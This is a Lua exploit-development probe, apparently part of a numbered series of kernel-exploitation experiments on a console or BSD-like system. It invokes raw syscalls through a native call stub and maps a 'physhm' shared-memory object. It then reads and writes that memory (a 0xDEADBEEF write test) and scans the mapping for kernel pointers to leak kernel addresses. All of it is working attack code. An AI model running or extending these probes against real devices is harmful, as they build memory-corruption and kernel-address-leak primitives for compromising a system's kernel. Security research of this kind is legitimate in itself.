-- CRASH_CLASS: MODERATE
-- PROBE 122a2: Minimal physhm read with safe hex output
--
-- 122a died during hex dump — either reading the mapping crashes
-- past pcall, or uint64 formatting produces binary. This probe:
-- 1. Opens physhm fd (known working)
-- 2. mmaps it (known working)
-- 3. Reads ONE byte at a time with explicit markers
-- 4. Uses memory.read_byte if available, else read_dword with mask

print("=== PROBE 122a2: PHYSHM SAFE READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function full_addr(v)
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return uint64(string.format("0x%X%08X", h, l))
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sc629 = mk(629)
local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_close = mk(6)

-- Open physhm
print("M1 opening")
local fd_raw = sc629(uint64(1), uint64(2), uint64(0), uint64(0))
local fd_h, fd_l = get_hi_lo(fd_raw)
if fd_h < 0 then fd_h = fd_h + 0x100000000 end
if fd_l < 0 then fd_l = fd_l + 0x100000000 end
if fd_h == 0xFFFFFFFF then print("OPEN FAIL") return end
local fd = fd_l
print("M2 fd=" .. fd)

-- mmap
print("M3 mapping")
local map_raw = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fd), uint64(0))
local map_h, map_l = get_hi_lo(map_raw)
if map_h < 0 then map_h = map_h + 0x100000000 end
if map_h >= 0xFFFF8000 then print("MMAP FAIL: " .. fmt_q(map_raw)) return end
local base = full_addr(map_raw)
print("M4 base=" .. fmt_q(map_raw))

-- Test: can we read a dword at all?
print("M5 single dword read test")
local ok1, v1 = pcall(function() return memory.read_dword(base) end)
print("M6 ok=" .. tostring(ok1))
if ok1 then
    local n1 = N(v1)
    if n1 < 0 then n1 = n1 + 0x100000000 end
    -- Use modular arithmetic to stay in safe range
    local hi16 = math.floor(n1 / 65536)
    local lo16 = n1 - hi16 * 65536
    print(string.format("M7 dw0=%04X_%04X", hi16, lo16))
end

-- If that worked, try a few more strategic offsets
print("M8 strategic reads")
local offsets = {0, 4, 8, 0x10, 0x18, 0x20, 0x28, 0x30,
                 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78,
                 0x80, 0x88, 0x90, 0x98, 0xA0, 0xA8, 0xB0, 0xB8,
                 0xC0, 0xC8, 0xD0, 0xD8, 0xE0, 0xE8, 0xF0, 0xF8,
                 0x100, 0x108, 0x110, 0x118, 0x120, 0x140, 0x160, 0x180,
                 0x200, 0x280, 0x300, 0x400, 0x500, 0x800, 0xC00, 0xF00}

for _, off in ipairs(offsets) do
    local addr = base + uint64(off)
    local ok_r, val = pcall(function() return memory.read_dword(addr) end)
    if not ok_r then
        print(string.format("  +%04X: DEAD", off))
        break
    end
    local n = N(val)
    if n < 0 then n = n + 0x100000000 end
    local hi16 = math.floor(n / 65536)
    local lo16 = n - hi16 * 65536
    print(string.format("  +%04X: %04X_%04X", off, hi16, lo16))
end

-- Canary
local c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED after reads!") return end
print("M9 alive")

-- Now try qword reads with explicit hi/lo formatting
print("")
print("M10 qword reads (hi:lo)")
local q_offsets = {0, 8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38,
                   0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78,
                   0x80, 0x88, 0x90, 0x98, 0xA0, 0xA8, 0xB0, 0xB8,
                   0xC0, 0xC8, 0xD0, 0xD8, 0xE0, 0xE8, 0xF0, 0xF8}
for _, off in ipairs(q_offsets) do
    local addr = base + uint64(off)
    local ok_r, val = pcall(function() return memory.read_qword(addr) end)
    if not ok_r then
        print(string.format("  +%03X: DEAD", off))
        break
    end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    -- Format each half safely
    local hh = math.floor(h / 65536)
    local hl = h - hh * 65536
    local lh = math.floor(l / 65536)
    local ll = l - lh * 65536
    print(string.format("  +%03X: %04X%04X_%04X%04X", off, hh, hl, lh, ll))
end

-- Canary again
c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED after qreads!") return end
print("M11 alive")

-- Write test at offset +0x800 (well into the page, unlikely to be critical)
print("")
print("M12 write test")
local test_addr = base + uint64(0x800)
local ok_orig, orig = pcall(function() return memory.read_dword(test_addr) end)
if ok_orig then
    local n_orig = N(orig)
    if n_orig < 0 then n_orig = n_orig + 0x100000000 end
    print(string.format("  orig=%04X_%04X", math.floor(n_orig/65536), n_orig % 65536))
end

local ok_w = pcall(function() memory.write_dword(test_addr, 0xDEADBEEF) end)
print("  write_ok=" .. tostring(ok_w))
if ok_w then
    local ok_rb, rb = pcall(function() return memory.read_dword(test_addr) end)
    if ok_rb then
        local n_rb = N(rb)
        if n_rb < 0 then n_rb = n_rb + 0x100000000 end
        print(string.format("  readback=%04X_%04X", math.floor(n_rb/65536), n_rb % 65536))
        local match = (n_rb == 0xDEADBEEF)
        print("  match=" .. tostring(match))
    end
    -- Restore
    if ok_orig then
        pcall(function() memory.write_dword(test_addr, N(orig)) end)
    end
end

-- Kernel pointer scan
print("")
print("M13 kptr scan")
local kcount = 0
for off = 0, 0x3FF8, 8 do
    local ok_r, val = pcall(function() return memory.read_qword(base + uint64(off)) end)
    if not ok_r then break end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
        kcount = kcount + 1
        if kcount <= 10 then
            if l < 0 then l = l + 0x100000000 end
            local hh = math.floor(h / 65536)
            local hl = h - hh * 65536
            local lh = math.floor(l / 65536)
            local ll = l - lh * 65536
            print(string.format("  +%04X: %04X%04X_%04X%04X", off, hh, hl, lh, ll))
        end
    end
end
print("  total=" .. kcount)

-- Cleanup
sc_munmap(base, uint64(0x4000))
sc_close(uint64(fd))

print("")
c = N(native.fcall_with_rax(stub, 20))
print(string.format("canary=%s", c == pid and "OK" or "FAIL"))
print("=== 122a2 COMPLETE ===")
